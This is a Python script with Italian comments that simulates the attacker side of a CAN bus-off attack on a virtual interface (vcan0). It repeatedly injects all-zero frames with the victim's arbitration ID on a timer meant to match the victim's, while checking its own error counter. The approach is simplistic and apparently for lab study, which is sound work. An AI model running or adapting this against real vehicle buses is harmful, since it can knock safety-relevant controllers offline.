import can
import time
import subprocess
import re

# --- CONFIGURAZIONE ---
CAN_INTERFACE = 'vcan0'
TARGET_ID = 0x123 
ATTACK_PERIOD_SEC = 5.0 # Deve essere uguale al periodo della Vittima
# ----------------------

def get_tec_info(interface):
    """
    Legge il valore di TEC (Transmit Error Counter) e lo stato del bus dal kernel.
    """
    try:
        command = ['ip', '-details', 'link', 'show', interface]
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        output = result.stdout
        
        tec_match = re.search(r'tec\s+(\d+)\s+rec\s+(\d+)', output)
        state_match = re.search(r'state\s+(\S+)', output) 

        tec_value = int(tec_match.group(1)) if tec_match else -1
        state = state_match.group(1).split('-')[0] if state_match else "UNKNOWN"
        
        return tec_value, state
            
    except Exception as e:
        return -2, "ERROR"

def start_attacker():
    """Simula l'attaccante che inietta messaggi malevoli in sync con la Vittima."""
    
    try:
        bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='socketcan')
        print(f"✅ [Attaccante] Connesso a {CAN_INTERFACE}.")
    except OSError as e:
        print(f"❌ [Attaccante] Errore di connessione a {CAN_INTERFACE}: {e}")
        return

    attack_counter = 0

    print("\n--- ATTACCO BUS-OFF SIMPLIFICATO AVVIATO ---")
    print(f"Periodo di Attacco (sincronizzato): {ATTACK_PERIOD_SEC} secondi")
    print("---------------------------------------------")

    while True:
        # 1. MONITORAGGIO TEC REALE PROPRIO
        tec_real, status_real = get_tec_info(CAN_INTERFACE)

        print(f"\n--- CICLO ATTACCANTE #{attack_counter+1} ({time.strftime('%H:%M:%S')}) ---")
        print(f"🔬 [Attaccante] TEC REALE: {tec_real}. Stato Kernel: {status_real}")
        
        # 2. CONTROLLO BUS OFF PROPRIO
        if status_real == "BUS": 
            print("🚨🚨 [Attaccante] BUS OFF RILEVATO! L'attaccante si è auto-disattivato.")
            break
        
        # 3. INIEZIONE DEL MESSAGGIO MALEVOLO
        try:
            # Il messaggio contiene dati (0x00) che causano l'errore bit/stuffing 
            # quando la Vittima sta trasmettendo il suo messaggio periodico.
            msg = can.Message(
                arbitration_id=TARGET_ID,
                data=[0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
                is_extended_id=False
            )
            bus.send(msg)
            print(f"💣 [Attaccante] Messaggio malevolo iniettato. Attesa {ATTACK_PERIOD_SEC}s...")
            
        except can.CanError as e:
            print(f"⚠️ [Attaccante] Errore durante l'invio: {e}. Interrompo.")
            break

        attack_counter += 1
        time.sleep(ATTACK_PERIOD_SEC) 

    bus.shutdown()
    print("\n🛑 [Attaccante] Disconnesso.")

if __name__ == '__main__':
    # Esegui la stessa funzione di utilità nel contesto dello script per l'Attaccante
    def get_tec_info(interface):
        try:
            command = ['ip', '-details', 'link', 'show', interface]
            result = subprocess.run(command, capture_output=True, text=True, check=True)
            output = result.stdout
            tec_match = re.search(r'tec\s+(\d+)\s+rec\s+(\d+)', output)
            state_match = re.search(r'state\s+(\S+)', output)
            tec_value = int(tec_match.group(1)) if tec_match else -1
            state = state_match.group(1).split('-')[0] if state_match else "UNKNOWN"
            return tec_value, state
        except Exception:
            return -2, "ERROR"

    start_attacker()
